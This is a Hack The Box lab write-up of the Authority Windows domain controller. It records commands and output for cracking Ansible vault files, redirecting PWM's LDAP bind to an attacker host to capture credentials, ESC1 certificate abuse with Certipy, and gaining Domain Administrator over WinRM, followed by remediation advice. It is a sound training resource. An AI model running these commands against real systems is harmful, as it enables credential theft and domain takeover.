---
title: "Authority — AD CS ESC1 via Ansible Vault Credential Exposure"
description: "An exposed Ansible vault and rogue LDAP listener expose service credentials, enabling ESC1 certificate abuse for Domain Administrator."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - windows
  - active-directory
  - ad-cs
  - esc1
  - ansible
  - credential-exposure
objective: "Escalate from guest-accessible SMB and an open PWM portal to Domain Administrator through Ansible-vault credential recovery and AD CS ESC1 abuse"
tools:
  - rustscan
  - NetExec
  - ansible2john
  - hashcat
  - ansible-vault
  - Responder
  - rusthound-ce
  - Certipy
  - evil-winrm
skill: "AD CS ESC1 abuse with rogue-LDAP credential capture"
outcome: "Certificate-authenticated Domain Administrator access through ESC1 abuse"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Medium |
| Target environment | Windows Active Directory Domain Controller |
| Starting position | Unauthenticated network access |
| Objective | Escalate from guest-accessible SMB and an open PWM portal to Domain Administrator through Ansible-vault credential recovery and AD CS ESC1 abuse |
| Outcome | Certificate-authenticated Domain Administrator access through ESC1 abuse |

## Ansible vault recovery and ESC1 abuse

Authority is a Medium-rated Hack The Box Windows Active Directory lab. An open PWM password self-service portal and guest SMB access expose Ansible vault files holding domain credentials. PWM administrative access then lets the LDAP bind target be redirected to a rogue listener that captures a service account's cleartext bind credentials. That service account has no direct certificate enrollment rights, but the domain permits non-privileged users to create machine accounts (MAQ=10). A new computer account enrolls the ESC1-vulnerable `<VULN_TEMPLATE>` template with the Administrator UPN, which yields the Administrator NTLM hash, and the service account is added to the built-in Administrators group for WinRM access to the Domain Controller. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Guest SMB → Ansible vault cracking → PWM admin access → rogue LDAP listener → service-account credential capture → machine-account creation (MAQ) → ESC1 certificate abuse → Administrator NTLM hash → Domain Administrator via WinRM**

## Domain controller, PWM portal, and unauthenticated start

- **Target:** Windows Active Directory Domain Controller (Medium difficulty).
- **Exposed services:** DNS (53), HTTP/IIS (80), Kerberos (88), RPC (135), NetBIOS (139), LDAP (389/636), SMB (445), WinRM (5985), Tomcat/PWM (8443), and .NET Message Framing (9389).
- **Starting position:** unauthenticated network access.
- **Objective:** reach Domain Administrator through the exposed services.
- **Constraints:** all activity stayed inside the isolated Hack The Box lab environment.

## Evidence: guest SMB to rogue LDAP and ESC1

### 1. Service Enumeration

Observation: the scan identifies the host as an Active Directory Domain Controller with LDAP, Kerberos, SMB, and WinRM. The LDAP certificate is signed by an internal certificate authority, port 8443 runs an Apache Tomcat application (PWM), and port 80 serves a default IIS page.

Action: enumerate open ports and service versions.

```bash
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV -oN nmap/<SCAN_OUTPUT>
```

Truncated scan output:

```text
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0
8443/tcp  open  ssl/http      Apache Tomcat (language: en)
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0
```

Significance: the fingerprint confirms an AD Domain Controller with certificate infrastructure (CA-signed LDAP certificate), a self-service password portal on Tomcat, and SMB.

Result: LDAP, Kerberos, SMB, WinRM, and PWM are all exposed.

### 2. PWM Discovery

Observation: PWM (Project PWM), an open-source LDAP password self-service portal, runs on port 8443.

Action: open the PWM login page.

```text
https://<TARGET_IP>:8443/pwm/private/login
```

The application banner reports:

```text
PWM is in open configuration mode and is not secure.
```

Significance: open configuration mode lets anyone reach the PWM configuration editor without authentication, exposing the LDAP infrastructure settings.

Result: the PWM configuration editor is reachable unauthenticated.

### 3. Guest SMB Access

Observation: SMB accepts guest logons, so shares can be enumerated; the `<SENSITIVE_SHARE>` share is readable as guest.

Action: list shares with guest credentials.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' --shares
```

Truncated share listing:

```text
SMB         <TARGET_IP>   445    <DC_HOST>    Share              Permissions    Remark
SMB         <TARGET_IP>   445    <DC_HOST>    -----              -----------    ------
SMB         <TARGET_IP>   445    <DC_HOST>    <SENSITIVE_SHARE>  READ
SMB         <TARGET_IP>   445    <DC_HOST>    IPC$               READ           Remote IPC
SMB         <TARGET_IP>   445    <DC_HOST>    NETLOGON                          Logon server share
SMB         <TARGET_IP>   445    <DC_HOST>    SYSVOL                            Logon server share
```

Action: spider the share and download accessible content.

```bash
nxc smb <TARGET_IP> -u 'a' -p '' -M spider_plus -o DOWNLOAD_FLAG=True
```

```text
SPIDER_PLUS <TARGET_IP>   445    <DC_HOST>    [+] All files processed successfully
```

Result: the `<SENSITIVE_SHARE>` share contents are retrieved for offline analysis.

### 4. Ansible Vault Discovery

Observation: the downloaded share contains Ansible automation for PWM under a defaults directory.

```text
<TARGET_IP>/<SENSITIVE_SHARE>/Automation/Ansible/PWM/defaults
```

The directory holds a `main.yaml` configuration file and three Ansible vault-encrypted files:

- `ldap_admin_password`
- `pwm_admin_password`
- `pwm_admin_login`

Significance: Ansible vault files store encrypted credentials, so the security of those secrets depends on vault password strength.

Result: three vault-encrypted credential files are present in the downloaded share.

### 5. Ansible Vault Cracking

Observation: the vault files can be converted to a hash format for offline cracking, and all three share one vault password.

Action: convert the vault files, then run a dictionary attack.

```bash
ansible2john ldap_admin_password pwm_admin_password pwm_admin_login > vault.hash
hashcat vault.hash /usr/share/wordlists/rockyou.txt --username
```

Recovered entry (hash and password redacted):

```text
$ansible$0*0*<HASH>:<VAULT_PASSWORD>
```

Significance: the Ansible vault hash format is recoverable offline, so a weak vault password falls quickly to a standard wordlist.

Result: all three vault files crack to the same `<VAULT_PASSWORD>`.

### 6. Vault Decryption

Observation: the cracked password decrypts all three vault files.

Action: decrypt each vault file with the recovered password.

```bash
printf '%s' '<VAULT_PASSWORD>' > /tmp/vaultpass
chmod 600 /tmp/vaultpass
ansible-vault decrypt ldap_admin_password --vault-password-file /tmp/vaultpass
ansible-vault decrypt pwm_admin_login --vault-password-file /tmp/vaultpass
ansible-vault decrypt pwm_admin_password --vault-password-file /tmp/vaultpass
```

```text
Decryption successful
Decryption successful
Decryption successful
```

Significance: the decrypted files yield a PWM admin login (`<PWM_SERVICE_ACCOUNT>`), a PWM admin password (`<PWM_ADMIN_PASSWORD>`), and a separate LDAP bind password (`<LDAP_ADMIN_PASSWORD>`).

Result: the PWM administrative credentials unlock the configuration editor.

### 7. PWM LDAP Configuration Manipulation

Observation: the PWM configuration editor is accessible with the decrypted PWM credentials, and the LDAP server URL is editable.

Action: open the configuration editor and repoint the LDAP URL to a rogue listener.

```text
https://<TARGET_IP>:8443/pwm/private/config/editor
```

```text
LDAP Directorys -> default -> Connection -> LDAP URLs -> Remove -> <DOMAIN> add -> ldap://<ATTACKER_HOST>:389
```

Action: start a rogue LDAP listener.

```bash
sudo responder
```

Significance: PWM sends a bind request to whatever LDAP URL is configured, so pointing it at an attacker-controlled listener captures the bind credentials in cleartext.

Result: the PWM LDAP profile is redirected to the rogue listener.

### 8. Service Account Credential Capture

Observation: testing the modified LDAP profile makes the PWM server send a cleartext bind to the rogue listener.

Action: trigger the profile test from the PWM configuration interface.

```text
Test LDAP profile
```

Captured bind (values redacted):

```text
[LDAP] Cleartext Client   : <TARGET_IP>
[LDAP] Cleartext Username : CN=<SERVICE_ACCOUNT>,OU=Service Accounts,OU=CORP,DC=<DOMAIN>,DC=<TLD>
[LDAP] Cleartext Password : <LDAP_PASSWORD>
```

Significance: the service account's distinguished name and password are disclosed in cleartext; the account has AD query rights and can interact with the certificate authority.

Result: `<SERVICE_ACCOUNT>` / `<LDAP_PASSWORD>` are recovered and subsequently validated through LDAP queries.

### 9. AD CS Enumeration

Observation: enumeration with the captured service account reveals a vulnerable certificate template.

Action: collect domain data and enumerate the certificate authority.

```bash
rusthound-ce --domain <DOMAIN> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' --zip -o <DOMAIN> --ldaps
nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M certipy-find
```

```text
CERTIPY-... <TARGET_IP>   389    <DC_HOST>    [!] Vulnerabilities
CERTIPY-... <TARGET_IP>   389    <DC_HOST>      ESC1  : Enrollee supplies subject and template allows client authentication
```

Significance: ESC1 requires a template that allows the enrollee to supply the subject/SAN, supports client authentication, grants enrollment to a low-privileged principal, and needs no manager approval. That combination permits certificate-based authentication as any user.

Result: the `<VULN_TEMPLATE>` template is vulnerable to ESC1.

### 10. Machine Account Creation

Observation: the service account has no direct enrollment rights on `<VULN_TEMPLATE>`, but the Machine Account Quota permits non-privileged users to create computer accounts.

Action: attempt to enroll the template directly as the service account.

```bash
certipy req -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -target '<DC_FQDN>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>'
```

```text
The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
```

Action: I checked the Machine Account Quota.

```bash
nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M maq
```

```text
MAQ         <TARGET_IP>   389    <DC_HOST>    MachineAccountQuota: 10
```

Action: create a new machine account.

```bash
nxc ldap <TARGET_IP> -u '<SERVICE_ACCOUNT>' -p '<LDAP_PASSWORD>' -M add-computer -o NAME="<CREATED_PC>" PASSWORD="<MACHINE_PASSWORD>"
```

```text
ADD-COMP... <TARGET_IP>   389    <DC_HOST>    Successfully added "<CREATED_PC>$" with password "<MACHINE_PASSWORD>"
```

Significance: the new computer account inherits enrollment rights the service account lacks, sidestepping the failed direct enrollment.

Result: `<CREATED_PC>$` is created as an enroll-capable principal.

### 11. ESC1 Certificate Abuse

Observation: the new machine account can enroll `<VULN_TEMPLATE>` and request a certificate with the Administrator UPN as the SAN.

Action: request the certificate, then authenticate with it.

```bash
certipy req -u '<CREATED_PC>$' -p '<MACHINE_PASSWORD>' -dc-ip <TARGET_IP> -ca '<CA_NAME>' -target '<DC_FQDN>' -template '<VULN_TEMPLATE>' -upn 'administrator@<DOMAIN>'
```

```bash
certipy auth -pfx <ADMIN_PFX> -dc-ip <TARGET_IP>
```

Significance: because the template lets the enrollee specify any UPN in the SAN, the CA issues a certificate for the Administrator UPN without verifying that the requester is that user. The resulting PFX enables PKINIT authentication, from which the Administrator NTLM hash is extracted.

Result: the certificate authenticates as Administrator and returns the Administrator NTLM hash.

### 12. Domain Administrator Access

Observation: with the Administrator hash, the LDAP shell can modify group membership and the service account can then log on over WinRM.

Action: add the service account to the built-in Administrators group.

```bash
certipy auth -pfx <ADMIN_PFX> -dc-ip <TARGET_IP> -ldap-shell
```

```text
ldap-shell input: add_user_to_group <SERVICE_ACCOUNT> Administrators
```

Action: authenticate over WinRM with the service account credentials.

```bash
evil-winrm -i <TARGET_IP> -u <SERVICE_ACCOUNT> -p '<LDAP_PASSWORD>'
```

Significance: adding the service account to Administrators grants Domain Administrator rights, and WinRM provides an interactive shell on the Domain Controller.

Result: the service account holds Domain Administrator access on the Domain Controller.

## The failed enrollment and the Machine Account Quota

| Challenge | Decision | Rationale |
|---|---|---|
| `<SERVICE_ACCOUNT>` lacks enrollment rights on the `<VULN_TEMPLATE>` template | Created a machine account under the domain's Machine Account Quota | The new computer account inherits template enrollment rights the service account lacks |

## Outcome: certificate-authenticated Domain Admin access

The supported outcome is certificate-authenticated Domain Administrator access via AD CS ESC1. The source reports the certificate issuance, NTLM hash extraction, and WinRM logon without preserved command output, so those final transitions are inferred from the record's narrative. HTTP/IIS on port 80 was enumeration-only.

## Recommendations: PWM config, guest SMB, the vault, LDAP binds, and ESC1

Each item pairs an observed root cause with its demonstrated impact and a prioritized action. Recommendations build on the source remediation; remaining items are general hardening; none was tested.

1. **PWM open configuration mode.** Root cause: PWM ran in open configuration mode, exposing its configuration editor without authentication. Demonstrated impact: an unauthenticated party could read LDAP infrastructure settings and repoint directory bind traffic to an attacker-controlled listener. *Recommendation:* disable open configuration mode and require authentication for all PWM administrative functions.
2. **Guest SMB access.** Root cause: SMB accepted guest logons and the `<SENSITIVE_SHARE>` share was world-readable. Demonstrated impact: Ansible automation and vault files were downloaded without credentials. *Recommendation:* deny guest SMB access and audit shared directories for credential-bearing artifacts.
3. **Weak Ansible vault password.** Root cause: the vault was protected by a weak password. Demonstrated impact: all three vault files fell to an offline dictionary attack, disclosing PWM and LDAP administrative credentials. *Recommendation:* enforce strong, unique vault passwords and prefer managed identities or a secrets manager over shared vault secrets. *Validation:* test vault password strength with an offline cracking pass.
4. **Cleartext LDAP bind.** Root cause: PWM sent LDAP bind credentials to the configured URL in cleartext. Demonstrated impact: a rogue listener captured a service account's distinguished name and password. *Recommendation:* require LDAPS for directory binds and validate the LDAP server certificate. *Detection:* monitor directory binds to unexpected or external hosts.
5. **ESC1 template combined with a permissive Machine Account Quota.** Root cause: the `<VULN_TEMPLATE>` template allowed the enrollee to supply the subject/SAN and granted enrollment to domain computers, while MAQ=10 let the service account create one. Demonstrated impact: certificate-based authentication as Administrator and full Domain Administrator access. *Recommendation:* restrict enrollment on ESC1-vulnerable templates to authorized groups, remove unneeded SAN specification, reduce the Machine Account Quota, and keep the client-authentication flag only where required.

## References

- [Hack The Box — Authority](https://app.hackthebox.com/machines/Authority) (retired machine)
- [RustScan](https://github.com/bee-san/RustScan) (fast port scanner)
- [NetExec](https://github.com/Pennyw0rth/NetExec) (SMB/LDAP enumeration and module runner)
- [Responder](https://github.com/lgandx/Responder) (rogue authentication server, including LDAP capture)
- [Certipy](https://github.com/ly4k/Certipy) (AD CS enumeration and abuse)
- [Hashcat](https://hashcat.net/hashcat/) (offline password recovery)
- [Ansible Vault](https://docs.ansible.com/ansible/latest/cli/ansible-vault.html) (vault encryption and decryption reference)
- [John the Ripper — `ansible2john`](https://github.com/openwall/john/blob/bleeding-jumbo/run/ansible2john.py) (Ansible vault hash extraction)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm) (WinRM interactive shell)
- [RustHound-CE](https://github.com/g0h4n/RustHound-CE) (Active Directory and AD CS collector)
- [Microsoft Learn — Certificate template concepts](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/certificate-template-concepts) (subject/SAN and client-authentication template conditions behind ESC1)
- [Microsoft Learn — Default limit to the number of workstations a user can join to the domain](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/default-workstation-numbers-join-domain) (Machine Account Quota default of 10)
- [Microsoft Learn — Enable LDAP over SSL (LDAPS) with a third-party certification authority](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/enable-ldap-over-ssl-3rd-certification-authority) (LDAPS and server-certificate validation)
